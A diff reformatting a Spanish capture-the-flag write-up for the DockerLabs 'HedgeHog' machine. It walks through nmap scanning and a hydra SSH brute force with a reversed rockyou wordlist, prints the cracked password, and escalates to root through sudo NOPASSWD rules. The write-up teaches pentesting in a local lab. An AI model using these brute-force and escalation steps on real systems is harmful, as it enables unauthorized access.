@@ -1,22 +1,30 @@
-# 🖥️ Writeup - HedgeHog 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# HedgeHog ​​
+
+## 🖥️ Writeup - HedgeHog
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `Hydra` `Wordlist Manipulation` `Sudoers` `Lateral Movement`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip hedgehog.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh hedgehog.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 18:50 CEST
 Nmap scan report for 172.17.0.2
@@ -82,11 +91,9 @@ Tenemos abiertos los puertos `22` y `80`.
 
 Accedemos por `HTTP` y observamos lo siguiente:
 
-![alt text](../images/tails.png)
-
 Es posible que `tails` sea un usuario del sistema, por lo que intentamos obtener credenciales mediante un ataque de `fuerza bruta` por `SSH`.
 
-# FUERZA BRUTA
+## FUERZA BRUTA
 
 ```bash
 hydra -l tails -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -t 60
@@ -107,6 +114,7 @@ hydra -l tails -P rockyou_reversed.txt 172.17.0.2 ssh -t 60
 ```
 
 Info:
+
 ```
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -117,21 +125,23 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-11 17:40:
 [DATA] attacking ssh://172.17.0.2:22/
 [22][ssh] host: 172.17.0.2   login: tails   password: 3117548331
 ```
-Hemos obtenido credenciales para el usuario `tails` : `3117548331`. 
-Accedemos por SSH.
+
+Hemos obtenido credenciales para el usuario `tails` : `3117548331`. Accedemos por SSH.
 
 ```bash
 ssh tails@172.17.0.2
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo` y `SUID`.
-```bash 
+
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 User tails may run the following commands on e975f87013d2:
     (sonic) NOPASSWD: ALL
@@ -145,11 +155,12 @@ sudo -u sonic bash
 
 Una vez autenticados como `sonic`, revisamos de nuevo permisos `sudo` y `SUID`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 User sonic may run the following commands on e975f87013d2:
     (ALL) NOPASSWD: ALL
@@ -162,6 +173,7 @@ sudo su
 ```
 
 Info:
+
 ```
 root@e975f87013d2:/home/tails# whoami
 root
